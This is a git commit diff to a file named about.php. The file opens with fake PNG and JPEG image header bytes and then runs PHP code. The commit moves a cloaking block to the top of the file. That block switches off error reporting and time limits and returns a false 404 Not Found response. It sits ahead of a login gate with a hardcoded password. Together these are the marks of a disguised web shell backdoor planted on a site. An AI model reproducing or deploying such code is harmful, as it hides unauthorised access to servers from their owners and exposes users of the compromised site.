33653dab2f58ed8698d2b33b4809bd87b936951a
TN.RIJ4L <59259192+rijal-cpu@users.noreply.github.com>
2025-07-31 16:43:32 +0800

    Update about.php

--- about.php
+++ about.php
@@ -1,7 +1,13 @@
 ‰PNG
 
 IHDR  ô      Õæš   sRGB ®Îé    IDATx^ì½ ¼eWY6þœÞn™;%3™™´	é$„ Ò‹` B>APP)Ÿˆ€X@#¨ØåD”À
-ÿØÿà JFIF  ` `  ÿþš<?php
+ÿØÿà JFIF  ` `  ÿþš
+<?php
+@set_time_limit(0);
+@error_reporting(0);
+@header('HTTP/1.1 404 Not Found', true, 404);
+?>
+<?php
 session_start();
 
 $hashed_password = password_hash('jal888', PASSWORD_DEFAULT);
@@ -64,11 +70,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     }
 }
 checkLogin();
-?>
-<?php
-@set_time_limit(0);
-@error_reporting(0);
-@header('HTTP/1.1 404 Not Found', true, 404);
 ?>
 <!DOCTYPE html>
 <html>
